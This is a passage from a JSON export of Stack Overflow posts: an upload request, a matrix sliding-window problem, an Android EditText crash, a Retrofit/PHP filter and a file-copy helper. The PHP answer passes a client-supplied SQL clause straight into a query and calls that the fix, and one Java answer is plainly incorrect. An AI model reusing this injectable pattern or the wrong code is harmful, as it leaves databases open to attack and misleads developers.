CONNECT\nKept Alive  No\nContent-Type    \nClient Address  127.0.0.1:49462\nRemote Address  admin.example.com/67.11.108.24:443\nConnection  \nWebSockets  -\nTiming  \nSize    \nRequest 10.03 KB (10,268 bytes)\nTLS Handshake   1.29 KB (1,318 bytes)\nHeader  -\nQuery String    -\nCookies -\nBody    8.74 KB (8,950 bytes)\nUncompressed Body   -\nCompression -\nResponse    26.71 KB (27,353 bytes)\nTotal   36.74 KB (37,621 bytes)\n</code></pre>\n<p>the body was not null, why the server did not recieve the content? what should I do to fix this problem? This is the curl I pasted from postman:</p>\n<pre><code>curl --location --request POST 'https://admin.example.com/service/soa-dolphin-org/service/dolphin/report/org/user/import/list' \\\n--header 'token: 0e3a2907dfe490eae2c1erea4726c9de7' \\\n--header 'Content-Type: application/vnd.openxmlformats-officedocument.spreadsheetml.sheet' \\\n--data-binary '@/Users/dolphin/Downloads/Book1.xlsx'\n</code></pre>\n"},{"tags":["java","arrays","algorithm","data-structures","sliding-window"],"comments":[{"owner":{"display_name":"user1196549"},"score":0,"creation_date":1639738359,"post_id":70391849,"comment_id":124430972,"body_markdown":"What is a &quot;fixed window k&quot; ? Traverse: from where to where ? Your explanations are barely intelligible.","body":"What is a &quot;fixed window k&quot; ? Traverse: from where to where ? Your explanations are barely intelligible."},{"owner":{"account_id":3700957,"reputation":13521,"user_id":3080723,"display_name":"Stef"},"score":1,"creation_date":1639738435,"post_id":70391849,"comment_id":124431006,"body_markdown":"8 directions? I might lack imagination, but with left-right, up-down, and the two diagonals, I only count 4","body":"8 directions? I might lack imagination, but with left-right, up-down, and the two diagonals, I only count 4"},{"owner":{"account_id":7142980,"reputation":323253,"user_id":5459839,"display_name":"trincot"},"score":0,"creation_date":1639739633,"post_id":70391849,"comment_id":124431436,"body_markdown":"Negative values allowed?","body":"Negative values allowed?"},{"owner":{"account_id":19207040,"reputation":45,"user_id":14033684,"display_name":"Shubham Khatri"},"score":0,"creation_date":1639740055,"post_id":70391849,"comment_id":124431581,"body_markdown":"@trincot yes negative values are allowed","body":"@trincot yes negative values are allowed"},{"owner":{"account_id":19207040,"reputation":45,"user_id":14033684,"display_name":"Shubham Khatri"},"score":0,"creation_date":1639740137,"post_id":70391849,"comment_id":124431615,"body_markdown":"@YvesDaoust fixed window means that K consecutive numbers in any possible direction","body":"@YvesDaoust fixed window means that K consecutive numbers in any possible direction"},{"owner":{"account_id":7142980,"reputation":323253,"user_id":5459839,"display_name":"trincot"},"score":0,"creation_date":1639740257,"post_id":70391849,"comment_id":124431660,"body_markdown":"Can different directions be combined, or all k consecutive values should be on a straight line?","body":"Can different directions be combined, or all k consecutive values should be on a straight line?"},{"owner":{"account_id":19207040,"reputation":45,"user_id":14033684,"display_name":"Shubham Khatri"},"score":0,"creation_date":1639740424,"post_id":70391849,"comment_id":124431740,"body_markdown":"@trincot no it cannot be combined the consecutive K numbers should be linear i.e. either vertically or horizontally or diagonally.","body":"@trincot no it cannot be combined the consecutive K numbers should be linear i.e. either vertically or horizontally or diagonally."},{"owner":{"display_name":"user1196549"},"score":0,"creation_date":1639746810,"post_id":70391849,"comment_id":124433882,"body_markdown":"How much is K ?","body":"How much is K ?"},{"owner":{"account_id":19207040,"reputation":45,"user_id":14033684,"display_name":"Shubham Khatri"},"score":0,"creation_date":1639899696,"post_id":70391849,"comment_id":124462560,"body_markdown":"@YvesDaoust k is a variable size window","body":"@YvesDaoust k is a variable size window"},{"owner":{"display_name":"user1196549"},"score":0,"creation_date":1639929150,"post_id":70391849,"comment_id":124468191,"body_markdown":"I know, but that does not tell anything about the value.","body":"I know, but that does not tell anything about the value."},{"owner":{"display_name":"user1196549"},"score":0,"creation_date":1639929518,"post_id":70391849,"comment_id":124468284,"body_markdown":"The complexity of the row-wise and column-wise loops is O(n&#178;), and this is optimal. The diagonal-wise loops should be O(n&#178;) as well, this is where the problem lies. There is no need for a triple loop. Also think that there are two distinct diagonal directions.","body":"The complexity of the row-wise and column-wise loops is O(n&#178;), and this is optimal. The diagonal-wise loops should be O(n&#178;) as well, this is where the problem lies. There is no need for a triple loop. Also think that there are two distinct diagonal directions."}],"answers":[{"tags":[],"owner":{"account_id":1820313,"reputation":1528,"user_id":1654526,"accept_rate":36,"display_name":"Jack"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639737978,"creation_date":1639737978,"answer_id":70391963,"question_id":70391849,"body_markdown":"You can find the max subsequence linearly.\r\n\r\nGiven the sequence `2 3 4 5 2` with `k=3` start from `2 3 4` with `sum=9` and using two indexes - one pointing to `2` and one pointing to `4` - forward them modifying the `sum` accordingly:\r\n- Step 1: `sum=9-2+5=12`\r\n- Step 2: `sum=12-3+2=11`\r\n\r\nThis allows you to select the `max` linearly, which is much better than having a `n&#178;` brute force solution","title":"Write a program to find max sum of K size window in n*m matrix traversing in 8 possible directions linearly","body":"<p>You can find the max subsequence linearly.</p>\n<p>Given the sequence <code>2 3 4 5 2</code> with <code>k=3</code> start from <code>2 3 4</code> with <code>sum=9</code> and using two indexes - one pointing to <code>2</code> and one pointing to <code>4</code> - forward them modifying the <code>sum</code> accordingly:</p>\n<ul>\n<li>Step 1: <code>sum=9-2+5=12</code></li>\n<li>Step 2: <code>sum=12-3+2=11</code></li>\n</ul>\n<p>This allows you to select the <code>max</code> linearly, which is much better than having a <code>n</code> brute force solution</p>\n"},{"tags":[],"owner":{"account_id":22441289,"reputation":1,"user_id":16645769,"display_name":"TheCrudB0y"},"down_vote_count":1,"up_vote_count":0,"is_accepted":false,"score":-1,"last_activity_date":1639738664,"creation_date":1639738664,"answer_id":70392110,"question_id":70391849,"body_markdown":"\r\n    public int findMaximumSum(int[][] matrix, int key) {\r\n        int y = matrix.length - 1, x = matrix[0].length - 1;\r\n        int max = 0;\r\n        for (int i = 0; i &lt;= y; i++) {\r\n            for (int i1 = 0, j = key - 1; j &lt;= x; j++, i1++) {\r\n                int sum = matrix[i][i1] + matrix[i][j] + matrix[i][(i1 + j) / 2];\r\n                max = Math.max(max, sum);\r\n            }\r\n        }\r\n        return max;\r\n    }","title":"Write a program to find max sum of K size window in n*m matrix traversing in 8 possible directions linearly","body":"<pre><code>public int findMaximumSum(int[][] matrix, int key) {\n    int y = matrix.length - 1, x = matrix[0].length - 1;\n    int max = 0;\n    for (int i = 0; i &lt;= y; i++) {\n        for (int i1 = 0, j = key - 1; j &lt;= x; j++, i1++) {\n            int sum = matrix[i][i1] + matrix[i][j] + matrix[i][(i1 + j) / 2];\n            max = Math.max(max, sum);\n        }\n    }\n    return max;\n}\n</code></pre>\n"},{"tags":[],"owner":{"display_name":"user1196549"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1639931297,"creation_date":1639930836,"answer_id":70413202,"question_id":70391849,"body_markdown":"To cover the main diagonal direction, use the indexings `ar[i+j][j]` instead of `ar[i][j]`. Make sure to cover the whole matrix, while ensuring `0i+j&lt;n` and `0j&lt;m`. For a given `j`, `-ji&lt;n-j` so that the outer for loop is on `-m&lt;i&lt;n`. The the inner while loop is on `max(0,-i)j&lt;min(n-i,n)`.\r\n\r\nThe inner while loop keeps a similar structure and the process is still `O(nm)`.\r\n\r\nThe second diagonal is with `ar[i-j][j]`.","title":"Write a program to find max sum of K size window in n*m matrix traversing in 8 possible directions linearly","body":"<p>To cover the main diagonal direction, use the indexings <code>ar[i+j][j]</code> instead of <code>ar[i][j]</code>. Make sure to cover the whole matrix, while ensuring <code>0i+j&lt;n</code> and <code>0j&lt;m</code>. For a given <code>j</code>, <code>-ji&lt;n-j</code> so that the outer for loop is on <code>-m&lt;i&lt;n</code>. The the inner while loop is on <code>max(0,-i)j&lt;min(n-i,n)</code>.</p>\n<p>The inner while loop keeps a similar structure and the process is still <code>O(nm)</code>.</p>\n<p>The second diagonal is with <code>ar[i-j][j]</code>.</p>\n"}],"owner":{"account_id":19207040,"reputation":45,"user_id":14033684,"display_name":"Shubham Khatri"},"comment_count":11,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":416,"favorite_count":0,"down_vote_count":2,"up_vote_count":1,"answer_count":3,"score":-1,"last_activity_date":1640257679,"creation_date":1639737488,"question_id":70391849,"body_markdown":"I recently gave interview at a company and was rejected in final round having only one problem. \r\n\r\n**The interviewer stated a 2D-array of n*m length. We can traverse left right top down as well as both diagonally. A fixed window k was provided to find maximum sum of 1d array window traversing any of the way.**\r\n\r\n**The array is not sorted and doesn&#39;t have any pattern. No overlapping/rolling is possible at edges.**\r\n\r\n**1&lt;=n,m&lt;=10^5**\r\n\r\n```\r\nExample:- 2 3 4 5 2\r\n          3 1 8 9 9\r\n          4 4 3 2 8 \r\n          3 4 7 7 7\r\nn=4\r\nm=5\r\nk=3\r\n\r\nOutput :- Max Sum= 26\r\nExplanations:- (8+9+9)\r\n              second row has the largest sum window with size 3.\r\n```\r\n\r\nI gave the brute force approach for traversing all directions(8) along with sliding window approach to calculate the max sum.\r\n\r\nUnfortunately I was rejected and I still don&#39;t find the optimized solution for the problem made by the interviewer.\r\n\r\n**My code that I made-**\r\n\r\n(ignore the inputs required)\r\n\r\n```\r\nclass sliding {\r\n    public static void main(int ar[][], int k) {\r\n        int m = ar.length;\r\n        int n = ar[0].length;\r\n        int sum = 0;\r\n\r\n        if (m &gt;= k) { //for row-wise max window\r\n            for (int i = 0; i &lt; m; i++) {\r\n                int tempSum = 0;\r\n                int x = 0;\r\n                int j = 0;\r\n                while (j &lt; n) {\r\n                    tempSum += ar[i][j];\r\n                    if (j - x + 1 &lt; k)\r\n                        j++;\r\n                    else if (j - x + 1 == k) {\r\n                        sum = Math.max(tempSum, sum);\r\n                        tempSum = tempSum - ar[i][x];\r\n                        x++;\r\n                        j++;\r\n                    }\r\n                }\r\n            }\r\n        }\r\n        if (n &gt;= k) //for column-wise max window\r\n        {\r\n            for (int i = 0; i &lt; n; i++) {\r\n                int tempSum = 0;\r\n                int x = 0;\r\n                int j = 0;\r\n                while (j &lt; m) {\r\n                    tempSum += ar[i]][j];\r\n                if (j - x + 1 &lt; k)\r\n                    j++;\r\n                else if (j - x + 1 == k) {\r\n                    sum = Math.max(tempSum, sum);\r\n                    temSum = tempSum - ar[i][x];\r\n                    x++;\r\n                    j++;\r\n                }\r\n            }\r\n        }\r\n    }\r\n    //for diagonal-wise max\r\n    if (n &gt;= k &amp;&amp; m &gt;= k) {\r\n        for (int i = 0; i &lt; m; i++) {\r\n            for (int j = 0; j &lt; n; j++) {\r\n                int x = 0;\r\n                int p = i;\r\n                int q = j;\r\n                int p_initial = p;\r\n                int q_initial = q;\r\n                int tempSum = 0;\r\n                while (p &lt;= m - k &amp;&amp; q &lt;= n - k) {\r\n                    if (x &lt; k) {\r\n                        tempSum += ar[p++][q++];\r\n                        x++;\r\n                    } else if (x == k) {\r\n                        sum = Math.max(tempSum, sum);\r\n                        tempSum -= ar[p_initial][q_initial];\r\n                        p_initial++;\r\n                        q_initial++;\r\n                    }\r\n\r\n                }\r\n            }\r\n        }\r\n    }\r\n}// sum variable will store the final answer\r\n```\r\n**Complexity - O(n^3)**\r\n\r\n**Can someone optimize my approach or give better solution.**","title":"Write a program to find max sum of K size window in n*m matrix traversing in 8 possible directions linearly","body":"<p>I recently gave interview at a company and was rejected in final round having only one problem.</p>\n<p><strong>The interviewer stated a 2D-array of n*m length. We can traverse left right top down as well as both diagonally. A fixed window k was provided to find maximum sum of 1d array window traversing any of the way.</strong></p>\n<p><strong>The array is not sorted and doesn't have any pattern. No overlapping/rolling is possible at edges.</strong></p>\n<p><strong>1&lt;=n,m&lt;=10^5</strong></p>\n<pre><code>Example:- 2 3 4 5 2\n          3 1 8 9 9\n          4 4 3 2 8 \n          3 4 7 7 7\nn=4\nm=5\nk=3\n\nOutput :- Max Sum= 26\nExplanations:- (8+9+9)\n              second row has the largest sum window with size 3.\n</code></pre>\n<p>I gave the brute force approach for traversing all directions(8) along with sliding window approach to calculate the max sum.</p>\n<p>Unfortunately I was rejected and I still don't find the optimized solution for the problem made by the interviewer.</p>\n<p><strong>My code that I made-</strong></p>\n<p>(ignore the inputs required)</p>\n<pre><code>class sliding {\n    public static void main(int ar[][], int k) {\n        int m = ar.length;\n        int n = ar[0].length;\n        int sum = 0;\n\n        if (m &gt;= k) { //for row-wise max window\n            for (int i = 0; i &lt; m; i++) {\n                int tempSum = 0;\n                int x = 0;\n                int j = 0;\n                while (j &lt; n) {\n                    tempSum += ar[i][j];\n                    if (j - x + 1 &lt; k)\n                        j++;\n                    else if (j - x + 1 == k) {\n                        sum = Math.max(tempSum, sum);\n                        tempSum = tempSum - ar[i][x];\n                        x++;\n                        j++;\n                    }\n                }\n            }\n        }\n        if (n &gt;= k) //for column-wise max window\n        {\n            for (int i = 0; i &lt; n; i++) {\n                int tempSum = 0;\n                int x = 0;\n                int j = 0;\n                while (j &lt; m) {\n                    tempSum += ar[i]][j];\n                if (j - x + 1 &lt; k)\n                    j++;\n                else if (j - x + 1 == k) {\n                    sum = Math.max(tempSum, sum);\n                    temSum = tempSum - ar[i][x];\n                    x++;\n                    j++;\n                }\n            }\n        }\n    }\n    //for diagonal-wise max\n    if (n &gt;= k &amp;&amp; m &gt;= k) {\n        for (int i = 0; i &lt; m; i++) {\n            for (int j = 0; j &lt; n; j++) {\n                int x = 0;\n                int p = i;\n                int q = j;\n                int p_initial = p;\n                int q_initial = q;\n                int tempSum = 0;\n                while (p &lt;= m - k &amp;&amp; q &lt;= n - k) {\n                    if (x &lt; k) {\n                        tempSum += ar[p++][q++];\n                        x++;\n                    } else if (x == k) {\n                        sum = Math.max(tempSum, sum);\n                        tempSum -= ar[p_initial][q_initial];\n                        p_initial++;\n                        q_initial++;\n                    }\n\n                }\n            }\n        }\n    }\n}// sum variable will store the final answer\n</code></pre>\n<p><strong>Complexity - O(n^3)</strong></p>\n<p><strong>Can someone optimize my approach or give better solution.</strong></p>\n"},{"tags":["java","android-studio"],"comments":[{"owner":{"account_id":15180977,"reputation":1256,"user_id":10954249,"display_name":"DeePanShu"},"score":0,"creation_date":1640255330,"post_id":70460752,"comment_id":124553454,"body_markdown":"Empty text is not a number giving empty quotes &quot;&quot;, enable to parseFloat exception is coming.","body":"Empty text is not a number giving empty quotes &quot;&quot;, enable to parseFloat exception is coming."},{"owner":{"account_id":23699578,"reputation":63,"user_id":17722908,"display_name":"Farida Bayramova"},"score":0,"creation_date":1640256227,"post_id":70460752,"comment_id":124553792,"body_markdown":"So I should take care of the exception?","body":"So I should take care of the exception?"},{"owner":{"account_id":15180977,"reputation":1256,"user_id":10954249,"display_name":"DeePanShu"},"score":0,"creation_date":1640256274,"post_id":70460752,"comment_id":124553813,"body_markdown":"You can check that string is empty or not then parse into float, otherwise return","body":"You can check that string is empty or not then parse into float, otherwise return"}],"answers":[{"tags":[],"owner":{"account_id":21910204,"reputation":68,"user_id":16194758,"display_name":"Asad Ullah"},"down_vote_count":0,"up_vote_count":1,"is_accepted":true,"score":1,"last_activity_date":1640257599,"creation_date":1640257599,"answer_id":70461262,"question_id":70460752,"body_markdown":"first check if the the value you are getting from EditText is not null.\r\n\r\n    if(!yourEditText.isempty)\r\n    {\r\n    //Do your work here\r\n    }\r\n    else{\r\n    //EditText is null}\r\n\r\n","title":"Why my app stops when I delete all from EditText?","body":"<p>first check if the the value you are getting from EditText is not null.</p>\n<pre><code>if(!yourEditText.isempty)\n{\n//Do your work here\n}\nelse{\n//EditText is null}\n</code></pre>\n"}],"owner":{"account_id":23699578,"reputation":63,"user_id":17722908,"display_name":"Farida Bayramova"},"comment_count":3,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":true,"view_count":37,"favorite_count":0,"down_vote_count":0,"up_vote_count":0,"accepted_answer_id":70461262,"answer_count":1,"score":0,"last_activity_date":1640257599,"creation_date":1640255009,"question_id":70460752,"body_markdown":"I want to check if the value of EditText is greater than 5, I want the background of the edittext to become RED and it does so but stops when I delete the Text. Please help.\r\n \r\n\r\n      vibration.addTextChangedListener(new TextWatcher() {\r\n            @Override\r\n            public void beforeTextChanged(CharSequence s, int start, int count, int after) {\r\n            }\r\n\r\n            @Override\r\n            public void onTextChanged(CharSequence s, int start, int before, int count) {\r\n                vibration.setBackgroundColor(Color.YELLOW);\r\n            }\r\n\r\n            @Override\r\n            public void afterTextChanged(Editable s) {\r\n                float numV = Float.parseFloat(vibration.getText().toString());\r\n                if(numV &gt; 5){\r\n                    vibration.setBackgroundColor(Color.RED);\r\n                }else{\r\n                    return;\r\n                }\r\n            }\r\n        });","title":"Why my app stops when I delete all from EditText?","body":"<p>I want to check if the value of EditText is greater than 5, I want the background of the edittext to become RED and it does so but stops when I delete the Text. Please help.</p>\n<pre><code>  vibration.addTextChangedListener(new TextWatcher() {\n        @Override\n        public void beforeTextChanged(CharSequence s, int start, int count, int after) {\n        }\n\n        @Override\n        public void onTextChanged(CharSequence s, int start, int before, int count) {\n            vibration.setBackgroundColor(Color.YELLOW);\n        }\n\n        @Override\n        public void afterTextChanged(Editable s) {\n            float numV = Float.parseFloat(vibration.getText().toString());\n            if(numV &gt; 5){\n                vibration.setBackgroundColor(Color.RED);\n            }else{\n                return;\n            }\n        }\n    });\n</code></pre>\n"},{"tags":["java","php","android"],"answers":[{"tags":[],"owner":{"account_id":23461099,"reputation":1,"user_id":17515957,"display_name":"Anthony Mwangi"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640257012,"creation_date":1640257012,"answer_id":70461153,"question_id":70124670,"body_markdown":"Edited the interface to\r\n\r\n    public interface ApiInterface {\r\n    @GET(&quot;{PHP_QRY_FILE_NAME}&quot;)\r\n    Call&lt;List&lt;Growth&gt;&gt; getGrowthInfo(@Path(value=&quot;PHP_QRY_FILE_NAME&quot;,encoded = true) String mPhpQryFileName, @Query(value=&quot;mselectperiod&quot;,encoded = true) String mWhereClause);\r\n\r\n}\r\n\r\nI omitted the ***&#39;Value=&#39;*** and also It was supposed to be ***encoded to true(,encoded = true)***\r\n\r\nThen in my PHP file I edited as follows for the ***$_GET***\r\n\r\n&lt;!-- begin snippet: js hide: false console: true babel: false --&gt;\r\n\r\n&lt;!-- language: lang-html --&gt;\r\n\r\n    &lt;?php\r\n    require dirname(__FILE__).&#39;/../DbConnection/conn.php&#39;;\r\n\r\n    $mselectperiod = $_GET[&quot;mselectperiod&quot;];\r\n\r\n    if($conn){\r\n        $sqlStr = &quot;SELECT\r\n        YEAR(OrderBill.BillingDate) AS year,\r\n        SUM(MultiPay.Amount) AS growth_rate\r\n        FROM Rst_TblMultiPayModes MultiPay\r\n        LEFT OUTER JOIN Rst_TblOrderBills OrderBill\r\n        ON MultiPay.OrderBillCode = OrderBill.OrderBillCode\r\n        WHERE OrderBill.isBillCleared=1 AND OrderBill.isMerged=0\r\n        AND MultiPay.PaymentMode IN(1,2,3,4,6,7)\r\n        $mselectperiod\r\n\r\n        GROUP BY\r\n        YEAR(OrderBill.BillingDate)&quot;;\r\n\r\n        $sqlResult = mysqli_query($conn,$sqlStr);\r\n        $response = array();\r\n\r\n        while($row = mysqli_fetch_assoc($sqlResult)){\r\n            array_push($response,$row);\r\n        }\r\n        \r\n        echo json_encode($response);\r\n        mysqli_close($conn);\r\n    }else{\r\n        echo &quot;Host Connection Error&quot;;\r\n    }\r\n    ?&gt;\r\n\r\n\r\n&lt;!-- end snippet --&gt;\r\n\r\nAnd it worked fine . . .\r\n","title":"How can I use the retrofit @Query annotation for filtration in android","body":"<p>Edited the interface to</p>\n<pre><code>public interface ApiInterface {\n@GET(&quot;{PHP_QRY_FILE_NAME}&quot;)\nCall&lt;List&lt;Growth&gt;&gt; getGrowthInfo(@Path(value=&quot;PHP_QRY_FILE_NAME&quot;,encoded = true) String mPhpQryFileName, @Query(value=&quot;mselectperiod&quot;,encoded = true) String mWhereClause);\n</code></pre>\n<p>}</p>\n<p>I omitted the <em><strong>'Value='</strong></em> and also It was supposed to be <em><strong>encoded to true(,encoded = true)</strong></em></p>\n<p>Then in my PHP file I edited as follows for the <em><strong>$_GET</strong></em></p>\n<p><div class=\"snippet\" data-lang=\"js\" data-hide=\"false\" data-console=\"true\" data-babel=\"false\">\r\n<div class=\"snippet-code\">\r\n<pre class=\"snippet-code-html lang-html prettyprint-override\"><code>&lt;?php\nrequire dirname(__FILE__).'/../DbConnection/conn.php';\n\n$mselectperiod = $_GET[\"mselectperiod\"];\n\nif($conn){\n    $sqlStr = \"SELECT\n    YEAR(OrderBill.BillingDate) AS year,\n    SUM(MultiPay.Amount) AS growth_rate\n    FROM Rst_TblMultiPayModes MultiPay\n    LEFT OUTER JOIN Rst_TblOrderBills OrderBill\n    ON MultiPay.OrderBillCode = OrderBill.OrderBillCode\n    WHERE OrderBill.isBillCleared=1 AND OrderBill.isMerged=0\n    AND MultiPay.PaymentMode IN(1,2,3,4,6,7)\n    $mselectperiod\n\n    GROUP BY\n    YEAR(OrderBill.BillingDate)\";\n\n    $sqlResult = mysqli_query($conn,$sqlStr);\n    $response = array();\n\n    while($row = mysqli_fetch_assoc($sqlResult)){\n        array_push($response,$row);\n    }\n    \n    echo json_encode($response);\n    mysqli_close($conn);\n}else{\n    echo \"Host Connection Error\";\n}\n?&gt;</code></pre>\r\n</div>\r\n</div>\r\n</p>\n<p>And it worked fine . . .</p>\n"}],"owner":{"account_id":23461099,"reputation":1,"user_id":17515957,"display_name":"Anthony Mwangi"},"comment_count":0,"delete_vote_count":0,"reopen_vote_count":0,"close_vote_count":0,"is_answered":false,"view_count":49,"favorite_count":0,"down_vote_count":1,"up_vote_count":0,"answer_count":1,"score":-1,"last_activity_date":1640257012,"creation_date":1637930820,"question_id":70124670,"body_markdown":"I have a PHP file below\r\n\r\n    &lt;?php\r\n    require dirname(__FILE__).&#39;/../DbConnection/conn.php&#39;;\r\n\r\n    if($conn){\r\n        $sqlStr = &quot;SELECT\r\n    \tYEAR(OrderBill.BillingDate) AS year,\r\n    \tSUM(MultiPay.Amount) AS growth_rate\r\n    \tFROM Rst_TblMultiPayModes MultiPay\r\n    \tLEFT OUTER JOIN Rst_TblOrderBills OrderBill\r\n    \tON MultiPay.OrderBillCode = OrderBill.OrderBillCode\r\n    \tWHERE OrderBill.isBillCleared=1 AND OrderBill.isMerged=0\r\n    \tAND MultiPay.PaymentMode IN(1,2,3,4,6,7)\r\n    \t$_GET[&#39;mselectperiod&#39;]\r\n\r\n    \tGROUP BY\r\n    \tYEAR(OrderBill.BillingDate)&quot;;\r\n\r\n        $sqlResult = mysqli_query($conn,$sqlStr);\r\n    \t$response = array();\r\n\r\n    \twhile($row = mysqli_fetch_assoc($sqlResult)){\r\n    \t\tarray_push($response,$row);\r\n    \t}\r\n    \t\r\n    \techo json_encode($response);\r\n    \tmysqli_close($conn);\r\n    }else{\r\n        echo &quot;Host Connection Error&quot;;\r\n    }\r\n    ?&gt;\r\n\r\n\r\n\r\nThis PHP file works fine when I execute it in my browser as follows\r\n[Execution Result Of salegrowthratechartyear.php][1]\r\n\r\nNow when it comes to Android, I use Retrofit library as follows by creating an interface\r\n\r\n    public interface ApiInterface {\r\n        @GET(&quot;{PHP_QRY_FILE_NAME}&quot;)\r\n        Call&lt;List&lt;Growth&gt;&gt; getGrowthInfo(@Path(value=&quot;PHP_QRY_FILE_NAME&quot;,encoded = true) String mPhpQryFileName);\r\n    \r\n    }\r\n\r\nThen I call as follows\r\n\r\n    call = ChartApiClient.getApiClient().create(ApiInterface.class).getGrowthInfo(&quot;salesgrowthratechartyear.php);\r\n\r\nThe Above Also Works Fine But Only when I Remove $_GET[&#39;mselectperiod&#39;] In The PHP File.\r\nThe Problem Comes When I want To Use $_GET[&#39;mselectperiod&#39;] In That Php File in My Interface As Follows\r\n\r\n    public interface ApiInterface {\r\n        @GET(&quot;{PHP_QRY_FILE_NAME}&quot;)\r\n        Call&lt;List&lt;Growth&gt;&gt; getGrowthInfo(@Path(value=&quot;PHP_QRY_FILE_NAME&quot;,encoded = true) String mPhpQryFileName, @Query(&quot;mselectperiod&quot;) String mWhereClause);\r\n    \r\n    }\r\n\r\nThen I call as follows\r\n\r\n    call = ChartApiClient.getApiClient().create(ApiInterface.class).getGrowthInfo(&quot;salesgrowthratechartyear.php&quot;,SalesGrowthChart.mFinalSelectPeriodQry);\r\n\r\nNote That &#39;SalesGrowthChart.mFinalSelectPeriodQry&#39; is a variable That Receives a Changing String values as below\r\n\r\n&gt; &quot;AND YEAR(BillingDate)&gt;=2019 AND YEAR(BillingDate)&lt;=2022&quot;\r\n\r\nNothing happens. What am I missing?\r\n\r\n\r\n  [1]: https://i.stack.imgur.com/uIrcv.png","title":"How can I use the retrofit @Query annotation for filtration in android","body":"<p>I have a PHP file below</p>\n<pre><code>&lt;?php\nrequire dirname(__FILE__).'/../DbConnection/conn.php';\n\nif($conn){\n    $sqlStr = &quot;SELECT\n    YEAR(OrderBill.BillingDate) AS year,\n    SUM(MultiPay.Amount) AS growth_rate\n    FROM Rst_TblMultiPayModes MultiPay\n    LEFT OUTER JOIN Rst_TblOrderBills OrderBill\n    ON MultiPay.OrderBillCode = OrderBill.OrderBillCode\n    WHERE OrderBill.isBillCleared=1 AND OrderBill.isMerged=0\n    AND MultiPay.PaymentMode IN(1,2,3,4,6,7)\n    $_GET['mselectperiod']\n\n    GROUP BY\n    YEAR(OrderBill.BillingDate)&quot;;\n\n    $sqlResult = mysqli_query($conn,$sqlStr);\n    $response = array();\n\n    while($row = mysqli_fetch_assoc($sqlResult)){\n        array_push($response,$row);\n    }\n    \n    echo json_encode($response);\n    mysqli_close($conn);\n}else{\n    echo &quot;Host Connection Error&quot;;\n}\n?&gt;\n</code></pre>\n<p>This PHP file works fine when I execute it in my browser as follows\n<a href=\"https://i.stack.imgur.com/uIrcv.png\" rel=\"nofollow noreferrer\">Execution Result Of salegrowthratechartyear.php</a></p>\n<p>Now when it comes to Android, I use Retrofit library as follows by creating an interface</p>\n<pre><code>public interface ApiInterface {\n    @GET(&quot;{PHP_QRY_FILE_NAME}&quot;)\n    Call&lt;List&lt;Growth&gt;&gt; getGrowthInfo(@Path(value=&quot;PHP_QRY_FILE_NAME&quot;,encoded = true) String mPhpQryFileName);\n\n}\n</code></pre>\n<p>Then I call as follows</p>\n<pre><code>call = ChartApiClient.getApiClient().create(ApiInterface.class).getGrowthInfo(&quot;salesgrowthratechartyear.php);\n</code></pre>\n<p>The Above Also Works Fine But Only when I Remove $_GET['mselectperiod'] In The PHP File.\nThe Problem Comes When I want To Use $_GET['mselectperiod'] In That Php File in My Interface As Follows</p>\n<pre><code>public interface ApiInterface {\n    @GET(&quot;{PHP_QRY_FILE_NAME}&quot;)\n    Call&lt;List&lt;Growth&gt;&gt; getGrowthInfo(@Path(value=&quot;PHP_QRY_FILE_NAME&quot;,encoded = true) String mPhpQryFileName, @Query(&quot;mselectperiod&quot;) String mWhereClause);\n\n}\n</code></pre>\n<p>Then I call as follows</p>\n<pre><code>call = ChartApiClient.getApiClient().create(ApiInterface.class).getGrowthInfo(&quot;salesgrowthratechartyear.php&quot;,SalesGrowthChart.mFinalSelectPeriodQry);\n</code></pre>\n<p>Note That 'SalesGrowthChart.mFinalSelectPeriodQry' is a variable That Receives a Changing String values as below</p>\n<blockquote>\n<p>&quot;AND YEAR(BillingDate)&gt;=2019 AND YEAR(BillingDate)&lt;=2022&quot;</p>\n</blockquote>\n<p>Nothing happens. What am I missing?</p>\n"},{"tags":["java","android","inputstream","wifi-direct"],"comments":[{"owner":{"account_id":2414645,"reputation":11194,"user_id":2108972,"display_name":"greenapps"},"score":0,"creation_date":1473439156,"post_id":39412934,"comment_id":66156953,"body_markdown":"You should program that function your self. Reading chunks of bytes in a loop from the input stream and writing them to the output stream.","body":"You should program that function your self. Reading chunks of bytes in a loop from the input stream and writing them to the output stream."}],"answers":[{"tags":[],"owner":{"account_id":23247379,"reputation":337,"user_id":17335765,"display_name":"Marina"},"down_vote_count":0,"up_vote_count":0,"is_accepted":false,"score":0,"last_activity_date":1640256962,"creation_date":1640255246,"answer_id":70460797,"question_id":39412934,"body_markdown":"first of all, you should see WiFiDirectDemo project, there is the already working example there (sending an image file from gallery):\r\n[WiFiDirectDemo][1]\r\n\r\nand here&#39;s the copy file method:\r\n\r\n    public static boolean copyFile(InputStream inputStream, OutputStream out) {\r\n        byte[] buf = new byte[1024];\r\n        int len;\r\n        try {\r\n            while ((len = inputStream.read(buf)) != -1) {\r\n                out.write(buf, 0, len);\r\n            }\r\n            out.close();\r\n            inputStream.close();\r\n        } catch (IOException e) {\r\n            Log.d(WiFiDirectActivity.TAG, e.toString());\r\n            return false;\r\n        }\r\n        return true;\r\n    }\r\n\r\n  [1]: https://android.googlesource.com/platform/development/+/master/samples/WiFiDirectDemo/","title":"Android-How to transfer a file via wifi direct?","body":"<p>first of all, you should see WiFiDirectDemo project, there is the already working example there (sending an image file from gallery):\n<a href=\"https://android.googlesource.com/platform/development/+/master/samples/WiFiDirectDemo/\" rel=\"nofollow noreferrer\">WiFiDirectDemo</a></p>\n<p>and here's the copy file method:</p>\n<pre><code>public static boolean copyFile(InputStream inputStream, OutputStream out) {\n    byte[] buf = new byte[1024];\n    int len;\n    try {\n        while ((len = inputStream.read(buf)) != -1) {\n            out.write(buf, 0, len);\n        }\n        out.close();\n        inputStream.close();\n    } catch (IOException e) {\n        Log.d(WiFiDirectActivity.TAG, e.toString());\n        return false;\n    }\n    return 